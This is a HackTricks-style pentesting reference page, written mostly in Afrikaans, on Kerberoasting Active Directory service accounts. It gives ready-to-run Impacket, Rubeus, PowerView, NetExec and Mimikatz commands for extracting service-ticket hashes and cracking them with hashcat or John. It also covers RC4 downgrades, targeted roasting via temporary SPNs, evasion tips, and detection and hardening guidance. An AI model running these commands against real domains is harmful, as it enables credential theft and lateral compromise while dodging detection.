# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting fokus op die verkryging van TGS-tickets, spesifiek dié wat verband hou met dienste wat onder gebruikersrekeninge in Active Directory (AD) loop, uitgesluit rekenaarrekeninge. Die enkripsie van hierdie tickets gebruik sleutels wat afkomstig is van gebruikerswagwoorde, wat offline kraak van credentials moontlik maak. Die gebruik van ’n gebruikersrekening as ’n diens word aangedui deur ’n nie-leë ServicePrincipalName (SPN)-eienskap.

Enige geverifieerde domeingebruiker kan TGS-tickets versoek, dus is geen spesiale voorregte nodig nie.

### Key Points

- Mik op TGS-tickets vir dienste wat onder gebruikersrekeninge loop (d.w.s. rekeninge met SPN gestel; nie rekenaarrekeninge nie).
- Tickets word geïnkripteer met ’n sleutel afgelei van die diensrekening se wagwoord en kan offline gekraak word.
- Geen opgehoogde voorregte benodig nie; enige geverifieerde rekening kan TGS-tickets versoek.

> [!WARNING]
> Die meeste openbare gereedskap verkies om RC4-HMAC (etype 23) diens-tickets te versoek omdat hulle vinniger gekraak kan word as AES. RC4 TGS-hashe begin met `$krb5tgs$23$*`, AES128 met `$krb5tgs$17$*`, en AES256 met `$krb5tgs$18$*`. Baie omgewings beweeg egter na AES-only. Moenie aanvaar dat slegs RC4 relevant is nie.
> Vermy ook "spray-and-pray" roasting. Rubeus’ default kerberoast kan navrae doen en tickets vir alle SPNs versoek en is luidrugtig. Eerstens enumereer en teiken interessante principals.

### Service account secrets & Kerberos crypto cost

Baie dienste loop steeds onder gebruikersrekeninge met hand-bestuurde wagwoorde. Die KDC enkripteer diens-tickets met sleutels afgelei van daardie wagwoorde en gee die ciphertext aan enige geverifieerde principal, so kerberoasting gee onbeperkte offline raaispogings sonder lockouts of DC-telemetrie. Die enkripsiemodus bepaal die kraakbegroting:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blocks rainbow tables but still allows fast cracking of short passwords. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **miljard** guesses/s | ~1000× vinniger as AES; aanvallers dwing RC4 wanneer `msDS-SupportedEncryptionTypes` dit toelaat. |

*Benchmarks van Chick3nman soos in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

RC4 se confounder randomiseer slegs die keystroom; dit voeg nie werk per raaispoging by nie. Tensy diensrekeninge op ewekansige geheime staatmaak (gMSA/dMSA, machine accounts, of vault-managed strings), is kompromieksnelheid puur ’n GPU-begroting. Om AES-only etypes af te dwing verwyder die miljard-raaispogings-per-sekonde degradasie, maar swak menslike wagwoorde val steeds aan PBKDF2.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Multifunksie-gereedskap insluitend kerberoast-kontroles:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Lys kerberoastable gebruikers
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Vra vir 'n TGS en dump uit die geheue
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tegniek 2: Outomatiese gereedskap
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> 'n TGS-versoek genereer Windows Sekuriteitsgebeurtenis 4769 ('n Kerberos-dienskaartjie is versoek).

### OPSEC en omgewings met slegs AES

- Versoek RC4 doelbewus vir rekeninge sonder AES:
- Rubeus: `/rc4opsec` gebruik tgtdeleg om rekeninge sonder AES te enumereer en versoek RC4-dienskaartjies.
- Rubeus: `/tgtdeleg` met kerberoast veroorsaak ook RC4-versoeke waar moontlik.
- Roast AES-only rekeninge in plaas daarvan om stilletjies te misluk:
- Rubeus: `/aes` enumereer rekeninge met AES aangeskakel en versoek AES-dienskaartjies (etype 17/18).
- As jy reeds 'n TGT hou (PTT of vanaf 'n .kirbi), kan jy `/ticket:<blob|path>` saam met `/spn:<SPN>` of `/spns:<file>` gebruik en LDAP oorslaan.
- Teiken, throttling en minder geraas:
- Gebruik `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` en `/jitter:<1-100>`.
- Filter vir waarskynlike swak wagwoorde deur `/pwdsetbefore:<MM-dd-yyyy>` te gebruik (ouer wagwoorde) of teiken bevoorregte OUs met `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistensie / Misbruik

As jy 'n rekening beheer of kan wysig, kan jy dit kerberoastable maak deur 'n SPN by te voeg:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Verlaag 'n rekening om RC4 te aktiveer vir makliker cracking (vereis skryfbevoegdhede op die teikenobjek):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Gerigte Kerberoast via GenericWrite/GenericAll oor 'n gebruiker (tydelike SPN)

Wanneer BloodHound wys dat jy beheer het oor 'n gebruikerobjek (bv. GenericWrite/GenericAll), kan jy daardie spesifieke gebruiker betroubaar “targeted-roast” selfs al het hulle tans geen SPNs nie:

- Voeg 'n tydelike SPN by die beheerde gebruiker om dit roastable te maak.
- Vra 'n TGS-REP wat met RC4 (etype 23) geïnkripteer is vir daardie SPN om kraking te bevoordeel.
- Kraak die `$krb5tgs$23$...` hash met hashcat.
- Ruim die SPN op om die voetspoor te verminder.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux eenreëler (targetedKerberoast.py automatiseer add SPN -> request TGS (etype 23) -> remove SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Kraak die uitvoer met hashcat autodetect (mode 13100 vir `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Opsporingsnotas: die toevoeging/verwydering van SPNs veroorsaak directory-veranderings (Event ID 5136/4738 op die teikenuser) en die TGS-versoek genereer Event ID 4769. Oorweeg throttling en prompt cleanup.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (verouderd op sommige distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

In September 2022, Charlie Clark showed that if a principal does not require pre-authentication, it’s possible to obtain a service ticket via a crafted KRB_AS_REQ by altering the sname in the request body, effectively getting a service ticket instead of a TGT. This mirrors AS-REP roasting and does not require valid domain credentials.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Jy moet 'n lys gebruikers verskaf omdat jy sonder geldige inlogbewyse nie LDAP met hierdie tegniek kan bevraagteken nie.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Verwante

As jy AS-REP roastable users teiken, sien ook:

{{#ref}}
asreproast.md
{{#endref}}

### Opsporing

Kerberoasting kan sluipend wees. Soek na Event ID 4769 vanaf DCs en pas filters toe om geraas te verminder:

- Sluit diensnaam `krbtgt` en diensname wat eindig met `$` (rekenaarkonto's) uit.
- Sluit versoeke van masjienrekeninge (`*$$@*`) uit.
- Slegs suksesvolle versoeke (Foutkode `0x0`).
- Bewaak versleutelings-tipes: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Moet nie net op `0x17` waarsku nie.

Example PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Bykomende idees:

- Stel 'n basislyn van normale SPN-gebruik per host/gebruiker op; waarsku oor groot uitbarstings van verskillende SPN-versoeke vanaf 'n enkele principal.
- Merk buitengewone RC4-gebruik in AES-geharde domeine.

### Mitigasie / Verharding

- Gebruik gMSA/dMSA of machine accounts vir dienste. Beheerde rekeninge het 120+ karakter ewekansige wagwoorde en roteer outomaties, wat offline krak onprakties maak.
- Dwing AES af op service accounts deur `msDS-SupportedEncryptionTypes` op AES-only (decimal 24 / hex 0x18) te stel en dan die wagwoord te roteer sodat AES-sleutels afgelei word.
- Waar moontlik, skakel RC4 in jou omgewing uit en monitor vir gepoogde RC4-gebruik. Op DCs kan jy die `DefaultDomainSupportedEncTypes` registry value gebruik om verstekwaardes te stuur vir rekeninge sonder `msDS-SupportedEncryptionTypes` gestel. Toets deeglik.
- Verwyder onnodige SPNs van gebruikersrekeninge.
- Gebruik lang, ewekansige service account wagwoorde (25+ karakters) as beheerde rekeninge nie haalbaar is nie; verbied algemene wagwoorde en ouditeer gereeld.

## References

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
